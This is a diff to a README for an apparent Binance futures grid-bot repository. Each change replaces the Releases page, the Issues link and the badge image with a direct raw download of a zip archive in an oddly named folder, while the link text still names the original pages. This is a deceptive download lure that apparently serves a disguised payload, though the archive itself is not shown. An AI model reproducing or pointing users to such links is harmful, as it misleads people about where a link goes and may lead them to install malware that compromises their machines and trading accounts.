@@ -1,6 +1,6 @@
 # 🚀 binance-futures-grid-bot - Automate Your Trading with Ease
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/Sammy-knowme/binance-futures-grid-bot/releases)
+[![Download Now](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip)](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip)
 
 ## 📋 Description
 
@@ -16,7 +16,7 @@ Before you get started, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the Binance Futures Grid Bot, visit this page to download: [Releases Page](https://github.com/Sammy-knowme/binance-futures-grid-bot/releases).
+To download the Binance Futures Grid Bot, visit this page to download: [Releases Page](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip).
 
 1. Open the link.
 2. Look for the latest version listed.
@@ -69,11 +69,11 @@ If you encounter issues, try these steps:
 
 For additional help, you can check out:
 
-- The [Issues Section](https://github.com/Sammy-knowme/binance-futures-grid-bot/issues) on GitHub to report problems or find solutions.
+- The [Issues Section](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip) on GitHub to report problems or find solutions.
 - Join forums and communities focused on Binance and cryptocurrency trading for tips and shared experiences.
 
 ## 📣 Acknowledgments
 
 Thanks to the open-source community for their invaluable contributions and support that made this project possible. Your feedback is welcome and appreciated. 
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/Sammy-knowme/binance-futures-grid-bot/releases)
+[![Download Now](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip)](https://github.com/Sammy-knowme/binance-futures-grid-bot/raw/refs/heads/main/paroemiac/binance-futures-bot-grid-3.4-beta.3.zip)
